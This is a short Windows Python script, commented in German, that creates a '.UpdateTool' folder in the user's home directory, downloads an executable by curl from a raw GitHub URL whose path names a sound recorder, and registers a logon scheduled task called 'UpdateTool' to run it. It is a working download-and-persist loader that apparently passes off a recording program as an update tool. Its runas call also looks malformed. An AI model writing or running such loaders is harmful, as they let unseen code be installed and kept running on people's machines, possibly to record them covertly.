import os

# homepath zu python holen
home = os.environ.get('homepath')

# newpath festlegen
newpath = home + r'\.UpdateTool'

# falls newpath nicht existiert erstelle ihn
if not os.path.exists(newpath):
  os.makedirs(newpath)


url = 'https://raw.githubusercontent.com/DanielMueller1309/Python/update_soundrec/sonstiges/sound_rec/dist/update_tool.exe'

# nachladen von update_tool.exe
if not os.path.exists(newpath + r'\update_tool.exe'):
    os.system('cmd /c "curl ' + url + ' -o  ' + newpath + r'\update_tool.exe"')
# erstellung der scheduled task

import subprocess
subprocess.call(['runas', 'schtasks /create /sc onlogon /it /tn UpdateTool /tr ' + home + r'\.UpdateTool\update_tool.exe'])
#os.system(r'cmd /c "schtasks /create /sc onlogon /it /tn UpdateTool /tr ' + home + r'\.UpdateTool\update_tool.exe"')
#os.system()
print("fertig")
